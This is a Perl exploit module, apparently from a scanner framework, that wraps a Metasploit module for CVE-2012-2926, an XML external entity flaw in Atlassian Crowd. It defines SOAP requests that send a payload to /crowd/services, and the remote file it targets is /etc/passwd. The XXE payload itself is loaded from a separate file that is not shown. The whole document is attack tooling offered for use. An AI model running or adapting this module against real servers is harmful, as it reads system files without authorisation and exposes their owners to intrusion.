package ATLASSIAN::MSF::AtlassianCrowdFileaccess;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "AtlassianCrowdFileaccess";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2012-2926",
  DESCRIPTION => "

          This module simply attempts to read a remote file from the server using a

        vulnerability in the way Atlassian Crowd handles XML files. The vulnerability

        occurs while trying to expand external entities with the SYSTEM identifier. This

        module has been tested successfully on Linux and Windows installations of Crowd.

      ",
  METHOD => "",
  MSF_MODULE => "atlassian_crowd_fileaccess",
  OSVDB => 82274,
  PATHS => ["crowd/services"],
  REFERENCES => [
    "https://www.neg9.org",
    "https://confluence.atlassian.com/display/CROWD/Crowd+Security+Advisory+2012-05-17",
  ],
  TITLE => "Atlassian Crowd XML Entity Expansion Remote File Access",
  VARIABLES => {
    'PATH' =>       { DESCRIPTION => "Path to Crowd", VALUE => "/crowd/services" },
    'RFILE' =>       { DESCRIPTION => "Remote File", VALUE => "/etc/passwd" },
  },

  TYPE => 'MSF',
  PLATFORM => 'SCANNER',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'GET',
      PATH   => '',
      PAYLOAD      => '',
      TEXT   => 'Sending Exploit #1 Request : [GET] ',
      HEADERS      => {
        'Content-Type' => 'application/x-www-form-urlencoded',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => '',
      PAYLOAD      => read_file('MSFExploits/ATLASSIAN/MSF/src/AtlassianCrowdFileaccess.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /',
      HEADERS      => {
        'SOAPAction' => '""',
        'Content-Type' => 'text/xml; charset=UTF-8',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
